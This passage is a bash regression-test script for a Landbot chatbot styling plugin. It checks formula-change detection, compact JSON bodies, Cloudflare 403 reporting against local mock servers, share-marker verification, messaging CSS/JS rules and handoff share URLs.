"$C" js "$T/esc.js" --bot BOT --custom >/dev/null 2>"$T/esc.err"; grep -F 'Write the character itself' "$T/esc.err" >/dev/null && pass=$((pass+1)) || { fail=$((fail+1)); echo "FAIL an escape refusal does not say to write the character itself"; }

# formulas: the API re-derives `value` from `formula`, so the plugin's own formula edit is not someone else's change
jq '.data.diagram.nodes.f = {id:"f",template:"formulas",params:{field:"x",formula:"Sum(1, 1)",value:{"+":{args:[1,1]}},output:"default",version:"1.0"}}' "$T/good.json" > "$T/f1.json"
jq '.data.diagram.nodes.f.params.formula = "Sum(1, 2)" | .data.diagram.nodes.f.params.value = {"+":{args:[1,2]}}' "$T/f1.json" > "$T/f2.json"
jq '.data.diagram.nodes.f.params.value = {"+":{args:[9,9]}}' "$T/f1.json" > "$T/f3.json"
MOCK_DRAFT="$T/f1.json" "$DK" save BOTU >/dev/null 2>&1; MOCK_DRAFT="$T/f1.json" "$DK" pre BOTU >/dev/null 2>&1
MOCK_DRAFT="$T/f2.json" "$DK" post BOTU '{"nodes":{"f":{"params":{"field":"x","formula":"Sum(1, 2)","output":"default","version":"1.0"}}}}' >/dev/null 2>&1
g "own formula edit: re-derived value not pending" 0 f2.json
MOCK_DRAFT="$T/f1.json" "$DK" save BOTU >/dev/null 2>&1; MOCK_DRAFT="$T/f1.json" "$DK" pre BOTU >/dev/null 2>&1
MOCK_DRAFT="$T/f3.json" "$DK" post BOTU '{"nodes":{"f":{"params":{"field":"x","formula":"Sum(1, 1)","output":"default","version":"1.0"}}}}' >/dev/null 2>&1
g "value changed with the formula unchanged is pending" 65 f3.json
jq '.data.diagram.nodes.f.params.formula = "Sum(3, 3)" | .data.diagram.nodes.f.params.value = {"+":{args:[3,3]}}' "$T/f1.json" > "$T/f4.json"
MOCK_DRAFT="$T/f1.json" "$DK" save BOTU >/dev/null 2>&1; MOCK_DRAFT="$T/f1.json" "$DK" pre BOTU >/dev/null 2>&1
MOCK_DRAFT="$T/f4.json" "$DK" post BOTU '{"nodes":{"f":{"params":{"field":"x","formula":"Sum(1, 2)","output":"default","version":"1.0"}}}}' >/dev/null 2>&1
g "someone else's formula saved over ours is pending" 65 f4.json

# lb: JSON bodies go out compact (an indented body can be refused by the firewall), and a firewall 403 is named as one
cat > "$T/fw.py" <<'E'
import http.server, sys
class H(http.server.BaseHTTPRequestHandler):
    def log_message(self, *a): pass
    def do_POST(self):
        b = self.rfile.read(int(self.headers.get('Content-Length', 0))); open(sys.argv[2], 'wb').write(b)
        if self.path.startswith('/cf'):
            self.send_response(403); self.send_header('Content-Type', 'text/html; charset=UTF-8'); self.send_header('Server', 'cloudflare'); self.send_header('CF-RAY', 'abc123-MAD'); self.end_headers()
            self.wfile.write(b'<!DOCTYPE html><title>Attention Required! | Cloudflare</title>')
        elif self.path.startswith('/api403cf'):
            self.send_response(403); self.send_header('Content-Type', 'application/json'); self.end_headers(); self.wfile.write(b'{"detail":"Cloudflare Workers are not allowed for this plan"}')
        elif self.path.startswith('/api403'):
            self.send_response(403); self.send_header('Content-Type', 'application/json'); self.end_headers(); self.wfile.write(b'{"detail":"You do not have permission"}')
        else:
            self.send_response(400); self.send_header('Content-Type', 'application/json'); self.end_headers(); self.wfile.write(b'{"blocks":["x"]}')
    do_PATCH = do_POST; do_PUT = do_POST
http.server.HTTPServer(('127.0.0.1', int(sys.argv[1])), H).serve_forever()
E
FP=$(( 20000 + RANDOM % 20000 )); python3 "$T/fw.py" "$FP" "$T/sent" >/dev/null 2>&1 & FSRV=$!
for _ in 1 2 3 4 5 6 7 8 9 10; do curl -s -o /dev/null -X POST "http://127.0.0.1:$FP/x" && break; sleep 0.3; done
export LANDBOT_API_URL="http://127.0.0.1:$FP"
chk() { local name="$1" want="$2"; [ "$(cat "$T/sent" 2>/dev/null)" = "$want" ] && pass=$((pass+1)) || { fail=$((fail+1)); echo "FAIL $name: sent [$(cat "$T/sent" 2>/dev/null)], want [$want]"; }; }
rm -f "$T/sent"; "$L" POST /bots/x/draft/blocks "$(printf '{\n  "blocks": [\n    {"id": "a", "top": 200}\n  ]\n}')" >/dev/null 2>&1
chk "indented inline body sent compact" '{"blocks":[{"id":"a","top":200}]}'
printf '{\n    "blocks": [ {"id": "b"} ]\n}\n' > "$T/pretty.json"; rm -f "$T/sent"; "$L" POST /bots/x/draft/blocks "@$T/pretty.json" >/dev/null 2>&1
chk "indented @file body sent compact" '{"blocks":[{"id":"b"}]}'
rm -f "$T/sent"; "$L" POST /bots/x/draft/blocks '{"text":"a  b\n  c"}' >/dev/null 2>&1
chk "spaces inside strings kept" '{"text":"a  b\n  c"}'
rm -f "$T/sent"; "$L" POST /bots/x/draft/blocks 'not json' >/dev/null 2>&1; rc=$?
{ [ "$rc" = 65 ] && [ ! -e "$T/sent" ]; } && pass=$((pass+1)) || { fail=$((fail+1)); echo "FAIL a non-JSON write body is no longer refused before sending (rc=$rc)"; }
"$L" POST /cf/x '{}' >/dev/null 2>"$T/cf.err"; rc=$?
{ [ "$rc" = 1 ] && grep -F 'FIREWALL' "$T/cf.err" >/dev/null && grep -F 'abc123-MAD' "$T/cf.err" >/dev/null; } && pass=$((pass+1)) || { fail=$((fail+1)); echo "FAIL a Cloudflare 403 is not named as the firewall (rc=$rc)"; }
"$L" POST /api403cf/x '{}' >/dev/null 2>"$T/api2.err"; rc=$?
{ [ "$rc" = 1 ] && ! grep -F 'FIREWALL' "$T/api2.err" >/dev/null; } && pass=$((pass+1)) || { fail=$((fail+1)); echo "FAIL a JSON 403 that mentions Cloudflare was named as the firewall (rc=$rc)"; }
"$L" POST /api403/x '{}' >/dev/null 2>"$T/api.err"; rc=$?
{ [ "$rc" = 1 ] && ! grep -F 'FIREWALL' "$T/api.err" >/dev/null; } && pass=$((pass+1)) || { fail=$((fail+1)); echo "FAIL an API 403 was named as the firewall (rc=$rc)"; }
kill "$FSRV" 2>/dev/null; wait "$FSRV" 2>/dev/null

# verify-share: a marker that is published must be found every time, however large the style (pipefail + grep -q gave false FAILs)
V="$HERE/plugins/landbot/skills/landbot-style/scripts/verify-share"
VW="$T/vwww"; mkdir -p "$VW/H-1-AAA" "$VW/H-2-BBB"
python3 -c 'import json; s="/* lb-style: guard */\n"+"a{b:c}\n"*30000; json.dump({"version":"3.1.0","use_surrogate_interaction":True,"style":s,"foot":"x"*20000},open("'"$VW"'/H-1-AAA/index.json","w")); json.dump({"version":"3.1.0","use_surrogate_interaction":True,"style":"a{b:c}\n"*30000},open("'"$VW"'/H-2-BBB/index.json","w"))'
VP=$(( 20000 + RANDOM % 20000 )); (cd "$VW" && python3 -m http.server "$VP" --bind 127.0.0.1 >/dev/null 2>&1) & VSRV=$!
for _ in 1 2 3 4 5 6 7 8 9 10; do curl -s -o /dev/null "http://127.0.0.1:$VP/H-1-AAA/index.json" && break; sleep 0.3; done
vok=0; for _ in 1 2 3 4 5 6 7 8 9 10; do LANDBOT_CONFIG_BASE="http://127.0.0.1:$VP" "$V" H-1-AAA "lb-style: guard" >/dev/null 2>&1 && vok=$((vok+1)); done
[ "$vok" = 10 ] && pass=$((pass+1)) || { fail=$((fail+1)); echo "FAIL verify-share found a published marker in only $vok of 10 runs"; }
LANDBOT_CONFIG_BASE="http://127.0.0.1:$VP" "$V" H-2-BBB "lb-style: guard" >/dev/null 2>&1; [ $? = 1 ] && pass=$((pass+1)) || { fail=$((fail+1)); echo "FAIL verify-share passed a missing marker"; }
# verify-share (2026-10-03): with several bases it reads the first that has the config, names every URL it tried
# when none has it, and refuses a share URL on a host that does not serve v4 pages
LANDBOT_CONFIG_BASE="http://127.0.0.1:$VP/none http://127.0.0.1:$VP" "$V" H-1-AAA "lb-style: guard" >/dev/null 2>&1 && pass=$((pass+1)) || { fail=$((fail+1)); echo "FAIL verify-share did not fall through to the next base"; }
LANDBOT_CONFIG_BASE="http://127.0.0.1:$VP/a http://127.0.0.1:$VP/b" "$V" H-1-AAA >/dev/null 2>"$T/vs.err"; rc=$?
{ [ "$rc" = 1 ] && grep -F "$VP/a/H-1-AAA" "$T/vs.err" >/dev/null && grep -F "$VP/b/H-1-AAA" "$T/vs.err" >/dev/null; } && pass=$((pass+1)) || { fail=$((fail+1)); echo "FAIL verify-share did not name every config URL it tried (rc=$rc)"; }
env -u LANDBOT_CONFIG_BASE "$V" https://chats.landbot.io/v3/H-1-AAA/index.html >/dev/null 2>&1; [ $? = 65 ] && pass=$((pass+1)) || { fail=$((fail+1)); echo "FAIL verify-share accepted a legacy share host"; }
kill "$VSRV" 2>/dev/null; wait "$VSRV" 2>/dev/null

# messaging module (2026-10-02): the reply buttons must be ordered after the time with the same reach as
# "> * { order: 0 }", or the time wraps under the last button; and render must also run from the observer
# (one microtask per batch, capped per tick), or each time shows up to 400 ms after its text
MC="$HERE/plugins/landbot/skills/landbot-style/modules/messaging.css"; MJ="$HERE/plugins/landbot/skills/landbot-style/modules/messaging.js"
grep -F 'body.lb-js-messaging [data-lb-part="message-bubble"] > .lb-msg-buttons { order: 2; }' "$MC" >/dev/null \
  && pass=$((pass+1)) || { fail=$((fail+1)); echo "FAIL messaging.css: .lb-msg-buttons order is weaker than '> * { order: 0 }'"; }
! grep -E '^\.lb-msg-buttons \{([^}]*;)? *order *:' "$MC" >/dev/null \
  && pass=$((pass+1)) || { fail=$((fail+1)); echo "FAIL messaging.css: a bare .lb-msg-buttons order rule is outranked and does nothing"; }
{ grep -F 'Promise.resolve().then(function () { queued = false; render(); })' "$MJ" >/dev/null && grep -F 'if (queued || burst > 40) return;' "$MJ" >/dev/null \
  && grep -F 'setInterval(function () { burst = 0; render(); }, 400);' "$MJ" >/dev/null; } \
  && pass=$((pass+1)) || { fail=$((fail+1)); echo "FAIL messaging.js: render is not scheduled from the observer with a capped burst"; }

# handoff (2026-10-03): the share URL is the channel's own `url` (landbot.pro, .online or .site, one per brand),
# never a hardcoded landbot.pro (that 404'd for 87% of September's new web channels); LANDBOT_SHARE_HOST overrides
HT="$TROOT/ho"; mkdir -p "$HT"; cp "$SRC/handoff" "$HT/"
cat > "$HT/lb" <<'E'
#!/usr/bin/env bash
case "${LANDBOT_API_URL:-v0}" in
*/v2) echo '{"bot":{"id":4080195}}';;
*/v1) jq -n --arg u "${MOCK_ROW_URL-https://landbot.online/v3/H-9-ABC/index.html}" '{total:1,channels:[({id:9,uuid:"cu-9",token:"H-9-ABC",landbot:{version:"3.1.0"}} + (if $u != "" then {url:$u} else {} end))]}';;
*) echo '{"data":{"channels":["cu-9"]}}';;
esac
E
chmod +x "$HT/handoff" "$HT/lb"
out="$(env -u LANDBOT_SHARE_HOST -u LANDBOT_API_URL "$HT/handoff" b-1 2>/dev/null)"
case "$out" in *" share=https://landbot.online/v3/H-9-ABC/index.html "*) pass=$((pass+1));; *) fail=$((fail+1)); echo "FAIL handoff did not print the channel's own url: $out";; esac
out="$(env -u LANDBOT_API_URL MOCK_ROW_URL=https://landbot.site/v3/H-9-ABC/index.html "$HT/handoff" b-1 2>/dev/null)"
case "$out" in *" share=https://landbot.site/v3/H-9-ABC/index.html "*) pass=$((pass+1));; *) fail=$((fail+1)); echo "FAIL handoff did not follow a landbot.site url: $out";; esac
out="$(env -u LANDBOT_API_URL LANDBOT_SHARE_HOST=https://x.test/v3 "$HT/handoff" b-1 2>/dev/null)"
case "$out" in *" share=https://x.test/v3/H-9-ABC/index.html "*) pass=$((pass+1));; *) fail=$((fail+1)); echo "FAIL LANDBOT_SHARE_HOST no longer overrides the share host: $out";; esac
out="$(env -u LANDBOT_SHARE_HOST -u LANDBOT_API_URL MOCK_ROW_URL= "$HT/handoff" b-1 2>/dev/null)"; rc=$?
{ [ "$rc" = 2 ] && case "$out" in *" share=? "*) true;; *) false;; esac; } && pass=$((pass+1)) || { fail=$((fail+1)); echo "FAIL a channel without url was not reported as partial (rc=$rc): $out"; }
! grep -E 'landbot\.pro' "$SRC/handoff" | grep -v '^#' >/dev/null && pass=$((pass+1)) || { fail=$((fail+1)); echo "FAIL handoff hardcodes landbot.pro again"; }

echo "guards: $pass passed, $fail failed"
[ "$fail" = 0 ]
